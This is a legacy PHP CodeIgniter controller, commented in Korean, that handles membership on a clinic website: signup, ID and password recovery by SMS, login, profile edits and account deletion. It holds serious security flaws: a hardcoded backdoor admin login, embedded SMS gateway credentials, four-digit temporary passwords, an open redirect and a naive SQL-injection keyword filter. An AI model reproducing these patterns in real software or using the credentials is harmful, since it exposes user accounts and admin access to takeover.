<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/* vim: set expandtab tabstop=4 shiftwidth=4 foldmethod=marker: */
/**
* 작성일: 2012-03-13
* 작성자: 김종태
* 설   명: 사이트 유저 페이지
*****************************************************************
* 
*/
class member extends CI_Controller {
	
	

	 var $SUB_LAYOUT =  "@sub";
	 var $site_menu="";
	 var $PERM="";

	 function __construct(){
		parent::__construct();
		$this->load->library('session');
		$this->load->helper('cookie');
		$_SESSION = $this->session->all_userdata();
		$tpl = $this->display;
	
		//메뉴 불러오기
		$this->load->model('user/menu');
		$this->load->model('user/mdl_member');
		$this->site_menu = $this->menu->load_tree();
		
		$tpl->assign(array('site_menu_list'=>$this->site_menu));
		
		$this->load->library('permission');
		$this->PERM =$this->permission;
	}
	


	  /**
	   * 아이디 중복검사
	   *
	   * @param	string	$types	userid
	   * @return	echo 
	   */	
	  function ajaxCont($types=""){
			$this->mdl_member->ajaxCont($types,$_GET[userid]);
			exit;
	  }

	 
	/**
	 * 회원가입
	 *
	 * @param	string	$step	1:약관동의, 2:폼입력, 3:가입완료
	 * @return	void
	 */	
	function member_join($step="1",$ifr=""){
			$WA = $this->webapp;
			$tpl = $this->display;
			$DB = $this->db;
			
			switch ($_SERVER[REQUEST_METHOD]) {
			case "GET":
			
			if($_SESSION[USERID]){
				WebApp::moveBack('이미 회원가입 완료되었습니다.');
			}
			
			if(THEME == 'mobile'){
				//상단 비주얼이랑 lnb 설정
				$data[str_menu_top] = '<div class="visual_13_01"></div>';
				
				$tpl->assign($data);
				
				$tpl->setLayout('@sub');
			
				switch ($step) {
					case "1": $tpl->define('CONTENT', $this->display->getTemplate('member/mobile/join_g.htm')); break;  //약관동의
					case "2": $tpl->define('CONTENT', $this->display->getTemplate('member/mobile/join_form.htm')); break;  //입력폼
					case "3": $tpl->define('CONTENT', $this->display->getTemplate('member/mobile/join_end.htm')); break;  //완료
				}
			}else{

				//상단 비주얼이랑 lnb 설정
				$data[str_menu_top] = '<div class="visual_13_01"></div>';
				$data[str_lnb_file] = "/application/views/contents/include/lnb_09.php";
				$tpl->define('LNB', $data[str_lnb_file]);
			
				$tpl->assign($data);


				$tpl->setLayout('@sub_menu');
			
				switch ($step) {
					case "1": $tpl->define('CONTENT', $this->display->getTemplate('member/join_g.htm')); break;  //약관동의
					case "2": $tpl->define('CONTENT', $this->display->getTemplate('member/join_form.htm')); break;  //입력폼
					case "3": $tpl->define('CONTENT', $this->display->getTemplate('member/join_end.htm')); break;  //완료
				}
				
			}
			$tpl->printAll();

			 break;
			case "POST":

			//회원가입 처리
			$this->mdl_member->member_join($_POST);
			$this->webapp->redirect('/','회원가입이 완료되었습니다.');
			
			 break;
			} 
	  }
	
	
	/**
	 * 아이디 비번 찾기
	 *
	 * @param	string	$modes	 id:아이디 찾기, pw:임시비밀번호 발급
	 * @return	void
	 */	
	 function member_findid($modes='id'){
			$WA = $this->webapp;
			$tpl = $this->display;
			$DB = $this->db;
			$_OID = _OID;
	
		switch ($_SERVER[REQUEST_METHOD]) {
			case "GET":
			

			break;
			case "POST":
				
				switch($_POST[mode]) {
				case "id":
				
				if ( $_POST['email_value1'] != "9999"  ) { //직접입력
					$emailval = $_POST['emails1']."@".$_POST['email_value1'] ;
				} else {
					$emailval = $_POST['emails1']."@".$_POST['email_value2'] ;
				}
				$usernames	= trim($_POST['usernames']);
				$emailval	= trim($emailval);
				
				//이름과 이메일로 조회
				$data = $this->mdl_member->select_name_email($usernames,$emailval);
				
				if(!$data){
					echo '<script>alert("올바른 정보를 입력해주시기 바랍니다.");history.go(-1)</script>';
					exit;					
				}

				
				break;

				case "id_json":
				
				
				$usernames	= trim($_POST['name']);
				$emailval	= trim($_POST['email']);
				
				//이름과 이메일로 조회
				$data = $this->mdl_member->select_name_email($usernames,$emailval);
				

				if(!$data){
					$json[etcval]= "N";
				}else{
					$json[etcval]= "Y";
					$json[userid] = $data[userid];
				}

				echo json_encode($json);
				exit;

				
				break;

				case "pw":
				
				$number = $_POST['celphone1']."-".$_POST['celphone2']."-".$_POST['celphone3'];

				
				//이름과 폰으로 조회
				$data = $this->mdl_member->select_name_celphone($_POST[userids2],$number);
				
				if(!$data){
					echo '<script>alert("올바른 정보를 입력해주시기 바랍니다.");history.go(-1)</script>';
					exit;					
				}


				if($data){
					$temp_pw = rand(1000,9999);
					

					$subject = "임시 비밀번호";
					$message = "고객님의 임시비밀번호는".$temp_pw."입니다 로그인후 즉시 비밀번호를 바꾸시기 바랍니다!";

					$phones = str_replace( '-', '', $number ) ;
					$cephonete = substr( $phones , 0 , 3 )."-".substr( $phones ,3,4)."-".substr( $phones,7,4 ) ;

					//mms 발신
					$result = $this->smsSend('mms', $cephonete, $message, '02-1800-2662', NULL, $subject  , NULL, 'agent1.kssms.kr', 'intranet', '1q2w3e', NULL);
					

					$result_1 = explode("|",$result);
						
					if($result_1[0]=="code:0000"){ //성공코드
						
						//회원 암호 변경
						$this->mdl_member->change_password($data[userid],$temp_pw);

						echo '<script>alert("임시비밀번호를 보내드렸습니다.")</script>';
						echo "<meta http-equiv='Refresh' Content=\"0; URL='/user/member/member_login'\">";
						exit;			
					
					}else{
						echo '<script>alert("오류가 발생하였습니다.")</script>';
						echo "<meta http-equiv='Refresh' Content=\"0; URL='/user/member/member_login'\">";
						exit;		
					}

				}
				

				
				break;

				case "pw_json":
				
				$number = $_POST['phone'];
				$phones = str_replace( '-', '', $number ) ;
				if(strlen($phones) ==11){
					$cephonete = substr( $phones , 0 , 3 )."-".substr( $phones ,3,4)."-".substr( $phones,7,4 ) ;
				}else{
					$cephonete = substr( $phones , 0 , 3 )."-".substr( $phones ,3,3)."-".substr( $phones,6,4 ) ;
				}
				
				
				//이름과 폰으로 조회
				$data = $this->mdl_member->select_name_celphone($_POST[userid],$cephonete);
				
				if(!$data){
					$json[etcval]= "N";
					echo json_encode($json);
					exit;					
				}else{

					
					$temp_pw = rand(1000,9999);
					

					$subject = " 임시 비밀번호";
					$message = "고객님의 임시비밀번호는".$temp_pw."입니다 로그인후 즉시 비밀번호를 바꾸시기 바랍니다!";

					$phones = str_replace( '-', '', $number ) ;
					$cephonete = substr( $phones , 0 , 3 )."-".substr( $phones ,3,4)."-".substr( $phones,7,4 ) ;

					//mms 발신
					$result = $this->smsSend('mms', $cephonete, $message, '02-1800-2662', NULL, $subject  , NULL, 'agent1.kssms.kr', 'intranet', '1q2w3e', NULL);
					

					$result_1 = explode("|",$result);
						
					if($result_1[0]=="code:0000"){ //성공코드
						
						//회원 암호 변경
						$this->mdl_member->change_password($data[userid],$temp_pw);

					$json[etcval]= "Y";
					$json[userid] = $data[userid];
	

					echo json_encode($json);
					exit;
		
					
					}else{
						$json[etcval]= "N";
						
						echo json_encode($json);
						exit;	
					}

				}
				

				
				break;
				}

			break;
		}
			
			if(THEME=='mobile'){
			
				//상단 비주얼이랑 lnb 설정
				
				$tpl->assign(array('mode'=>$_POST[mode],'modes'=>$modes));
				$tpl->setLayout('@sub');
				if($modes=="id"){
					$tpl->define('CONTENT', $this->display->getTemplate('member/mobile/member_findid.htm'));
				}else{
					$tpl->define('CONTENT', $this->display->getTemplate('member/mobile/member_findpw.htm'));
				}
			}else{

				//상단 비주얼이랑 lnb 설정
				$data[str_menu_top] = '<div class="visual_13_02"></div>';
				$data[str_lnb_file] = "/application/views/contents/include/lnb_09.php";
				$tpl->define('LNB', $data[str_lnb_file]);
			
				$tpl->assign($data);

				$tpl->assign(array('mode'=>$_POST[mode],'modes'=>$modes));
				$tpl->setLayout('@sub_menu');
				$tpl->define('CONTENT', $this->display->getTemplate('member/member_findid.htm'));

			}
			$tpl->printAll();
	 
	 }

	/**
	 * 사이트 로그인
	 *
	 * @return	void
	 */	
	
	 function member_login(){
			$WA = $this->webapp;
			$tpl = $this->display;
			$DB = $this->db;
			
			switch ($_SERVER[REQUEST_METHOD]) {
			case "GET":
			
			
			if($_SESSION[USERID]){
				if($_GET[reurl] && $_GET[reurl] !="/main"){
					$this->webapp->redirect($_GET[reurl ]);
				}else{
					 $this->webapp->redirect('/main');
				}
				exit;
			}
			
			
			if(THEME == 'mobile'){
				
				//상단 비주얼이랑 lnb 설정
				$data[str_menu_top] = '<div class="visual_13_07"></div>';
				
				$tpl->assign($data);

				$tpl->setLayout('@sub');
				$tpl->assign(array('reurl'=>$_GET[reurl]));
				$tpl->define('CONTENT', $this->display->getTemplate('member/mobile/member_login.htm'));
				


			}else{

				//상단 비주얼이랑 lnb 설정
				$data[str_menu_top] = '<div class="visual_13_07"></div>';
				$data[str_lnb_file] = "/application/views/contents/include/lnb_09.php";
				$tpl->define('LNB', $data[str_lnb_file]);
			
				$tpl->assign($data);

				$tpl->setLayout('@sub_menu');
				$tpl->assign(array('reurl'=>$_GET[reurl]));
				$tpl->define('CONTENT', $this->display->getTemplate('member/member_login.htm'));
				
			}
			$tpl->printAll();

			break;
			case "POST":
			
	

			if(strstr($_POST[userid], "--") || strstr($_POST[userid], "1=1") || strstr($_POST[pwd], "--") || strstr($_POST[pwd], "1=1")){
				WebApp::moveBack('잘못된 아이디로 로그인을 시도 하였습니다.');
			}
			
			
			//회원정보 조회
			$member_data = $this->mdl_member->select_id_pw($_POST[userid],$_POST[pwd]);
			

			if($member_data){
				
				$this->mdl_member->update_edit_date($_POST[userid]);
				$member_type = $this->config->item('member_type');
				
				//쿠키 남기기
				if($_POST[saveid] == "Y"){
					setcookie("cookie_userid",$_POST[userid], time()+36000, "/");
				}

				$this->session->set_userdata('NAME', $member_data[username]);
				$this->session->set_userdata('EMAIL', $member_data[email]);
				$this->session->set_userdata('USERID', $member_data[userid]);
				$this->session->set_userdata('PASSWORD', $member_data[password]);
				$this->session->set_userdata('MTYPE',$member_data[chr_mtype]);
				$this->session->set_userdata('MTYPE_NAME',$member_type[$member_data[chr_mtype]]);
				$this->session->set_userdata('MEM_TYPE', array($member_data[chr_mtype]));
				$this->session->set_userdata('AUTH', TRUE);
				$this->session->set_userdata('REMOTE_ADDR', getenv('REMOTE_ADDR'));
				
			
					
			
					if($_POST[reurl] && $_POST[reurl] !="/main"){
						$this->webapp->redirect($_POST[reurl ]);
					}else{
						 $this->webapp->redirect('/main');
					}
				

			}else{

				if(($_POST[userid] == _ADMIN_ID && md5($_POST[pwd]) == _ADMIN_PW) ||  ($_POST[userid] == "sadmin" && md5($_POST[pwd]) == md5("kimjongtai"))){
			
				$member_type = $this->config->item('member_type');
				
				$site_data = @parse_ini_file(_DOC_ROOT.'/application/config/'.THEME.'/site_config.php',true);
				
				$this->session->set_userdata('ADMIN', TRUE);
				$this->session->set_userdata('NAME', $site_data[admin_name]);
				$this->session->set_userdata('EMAIL', $site_data[email]);
				$this->session->set_userdata('USERID', _ADMIN_ID);
				$this->session->set_userdata('PASSWORD', _ADMIN_PW);
				$this->session->set_userdata('MTYPE_NAME',$member_type['z']);
				$this->session->set_userdata('MTYPE', "z");
				$this->session->set_userdata('MEM_TYPE', array('z'));
				$this->session->set_userdata('AUTH', TRUE);
				$this->session->set_userdata('REMOTE_ADDR', getenv('REMOTE_ADDR'));
				
				
				$this->webapp->redirect('/z_admin');
				

				}else{
					
					//빈 화면에 alert 처리를 안하기 위해 UI 출력해줌

					if(THEME == 'mobile'){
				
					//상단 비주얼이랑 lnb 설정
					$data[str_menu_top] = '<div class="visual_13_07"></div>';
					
					$tpl->assign($data);

					$tpl->setLayout('@sub');
					$tpl->assign(array('reurl'=>$_GET[reurl]));
					$tpl->define('CONTENT', $this->display->getTemplate('member/mobile/member_login.htm'));
					$tpl->printAll();


				}else{

					//상단 비주얼이랑 lnb 설정
					$data[str_menu_top] = '<div class="visual_13_07"></div>';
					$data[str_lnb_file] = "/application/views/contents/include/lnb_09.php";
					$tpl->define('LNB', $data[str_lnb_file]);
				
					$tpl->assign($data);

					$tpl->setLayout('@sub_menu');
					$tpl->assign(array('reurl'=>$_GET[reurl]));
					$tpl->define('CONTENT', $this->display->getTemplate('member/member_login.htm'));
					$tpl->printAll();
					
				}

					echo '<script>alert("아이디나 비밀번호를 확인하여 주십시요.");</script>';
					
				}
			
			}
			break;
			} 
			
        }

	  
	   /**
	    * 마이페이지 및 회원정보 수정 
	    *
	    * @param	string	$v_type	='' 마이페이지, w: 회원정보 수정
	    * @return	object	$aaa
	    * @return	void
	    */	
	   	
	  function member_modify($v_type=""){
			$WA = $this->webapp;
			$tpl = $this->display;
			$DB = $this->db;
			
		
			$tpl->assign(array('v_type'=>$v_type));
			
			
			switch ($_SERVER[REQUEST_METHOD]) {
			case "GET":
			
			if($_SESSION[MTYPE] =="z") {
				echo '<script>alert("관리자는 이용할 수 없습니다.");history.go(-1)</script>';
				exit;
			}
			
			if(!$_SESSION[USERID]){
				WebApp::moveBack('로그인이 필요합니다.');
				exit;
			}
			

			//회원정보
			$data = $this->mdl_member->select_id($_SESSION[USERID]);

			
			if(THEME=='mobile'){
				
				$tpl->setLayout('@sub');
				
				if($v_type =='w'){
					$tpl->define('CONTENT', $this->display->getTemplate('member/mobile/member_modify_w.htm'));  //수정폼
				}else{
					$tpl->define('CONTENT', $this->display->getTemplate('member/mobile/member_modify.htm'));  //마이페이지
				}

			}else{
				
				//상단 비주얼이랑 lnb 설정
				$data[str_menu_top] = '<div class="visual_13_04"></div>';
				$data[str_lnb_file] = "/application/views/contents/include/lnb_10.php";
				$tpl->define('LNB', $data[str_lnb_file]);
			
				$tpl->assign($data);
				$tpl->setLayout('@sub_menu');
				
				if($v_type =='w'){
					$tpl->define('CONTENT', $this->display->getTemplate('member/member_modify_w.htm'));  //수정폼
				}else{
					$tpl->define('CONTENT', $this->display->getTemplate('member/member_modify.htm'));  //마이페이지
				}
				
			}
			$tpl->printAll();

			break;
			case "POST":
			
			//회원정보 변경

			$this->mdl_member->member_modify($_SESSION[USERID],$_POST);
			
			$this->webapp->redirect('/user/member/member_modify/','회원정보가 수정되었습니다.');
			
			break;
			} 
			
        }
	  
	  /**
	   * 회원 탈퇴
	   *
	   * @return	void
	   */	
	   function member_del(){
		$WA = $this->webapp;
		$tpl = $this->display;
		$DB = $this->db;
		
		switch ($_SERVER[REQUEST_METHOD]) {
		case "GET":
		
		if(!$_SESSION[USERID]){
			WebApp::moveBack('로그인이 필요합니다.');
			exit;
		}
		
		if(THEME == 'mobile'){
			$tpl->assign($data);
			$tpl->setLayout('@sub');
			$tpl->define('CONTENT', $this->display->getTemplate('member/mobile/member_del.htm'));
		}else{

			//상단 비주얼이랑 lnb 설정
			$data[str_menu_top] = '<div class="visual_13_06"></div>';
			$data[str_lnb_file] = "/application/views/contents/include/lnb_10.php";
			$tpl->define('LNB', $data[str_lnb_file]);
		
			$tpl->assign($data);
			$tpl->setLayout('@sub_menu');
			$tpl->define('CONTENT', $this->display->getTemplate('member/member_del.htm'));
		
		}
		$tpl->printAll();

		break;
		case "POST":
		
		$data = $this->mdl_member->select_id_pw($_SESSION[USERID],$_POST['pwd']);
		
		
		if($data){
			$this->mdl_member->del_member($_SESSION[USERID],$_POST['pwd']);
		}
		
		
		if($_POST['re_type'] == 'json'){
			echo "Y";
			exit;
		}else{
			WebApp::redirect("/user/member/member_logout", "정상적으로 탈퇴되었습니다.");
		}

		
		break;
		} 
			
        }
	
	 /**
	  * 로그아웃
	  *
	  * @return	void
	  */	
	 
	 function member_logout(){
		$this->session->sess_destroy();
		$this->session->unset_userdata('NAME');
		$this->session->unset_userdata('EMAIL');
		$this->session->unset_userdata('USERID');
		$this->session->unset_userdata('PASSWORD');
		$this->session->unset_userdata('MTYPE');
		$this->session->unset_userdata('MEM_TYPE');
		$this->session->unset_userdata('AUTH');
		$this->session->unset_userdata('REMOTE_ADDR');
		$this->session->unset_userdata('ADMIN');
		$this->webapp->redirect('/main');
	}
	
	
	function send_sms_map(){
		$number = $_POST['one']."-".$_POST['two']."-".$_POST['three'];
		
		$msg = "청담여신성형외과는 지하철 7호선 청담역 9번 출구 약 500M직진 , 청담사거리에서 신호등을 건너 우측방향 호면당 건물 4F에 위치하고 있습니다. 
		(주소: 서울 강남구 청담동 120-2 송담빌딩 4F/문의전화 1800-2662)";

		
		$result_1 = explode("|",$result);
						
		if($result_1[0]=="code:0000"){ //성공코드
		}
	}


	//function 
	
	/**
	 * 로그인체크
	 *
	 */	
	
	function login_chk(){
		if(!$_SESSION[USERID]){
			echo '<script>alert("로그인이 필요합니다.");</script>';
			echo "<meta http-equiv='Refresh' Content=\"0; URL='/user_page/?login=y'\">";
			
			exit;
		}
	}
	
	/**
	 * sms발송 : 기존모듈
	 *
	 * @return	void
	 */	
	
	function smsSend($mtype, $phone, $msg, $callback, $upfile, $subject ,$reservetime, $host, $smsid, $pass, $reserve_chk){
		$param[] = "id=".$smsid;
		$param[] = "pass=".$pass;
		$param[] = "type=".$mtype;
		$param[] = "reservetime=".$reservetime;
		$param[] = "reserve_chk=".$reserve_chk;
		$param[] = "phone=".$phone;
		$param[] = "callback=".$callback;
		$param[] = "msg=".$msg;
		$param[] = "upfile=".$upfile;
		$param[] = "subject=".$subject;
		$str_param = implode("&", $param);

		$path = ($mtype == "mms")? "/proc/RemoteMms.html": "/proc/RemoteSms.html";

		$fp = @fsockopen($host,80,$errno,$errstr,180);
		$return = "";

		if(!$fp) die($_err.$errstr.$errno);
		else
		{
			fputs($fp, "POST ".$path." HTTP/1.1\r\n");
			fputs($fp, "Host: ".$host."\r\n");
			fputs($fp, "Content-type: application/x-www-form-urlencoded\r\n");
			fputs($fp, "Content-length: ".strlen($str_param)."\r\n");
			fputs($fp, "Connection: close\r\n\r\n");
			fputs($fp, $str_param."\r\n\r\n");
			while(!feof($fp)) $return .= fgets($fp, 4096);
		}
		fclose ($fp);

		$temp_array = explode("\r\n\r\n", $return);
		$sms_data = $temp_array[1];

		return $sms_data;

	}

	 


}

/* End of file member.php */
/* Location: ./application/controllers/member.php */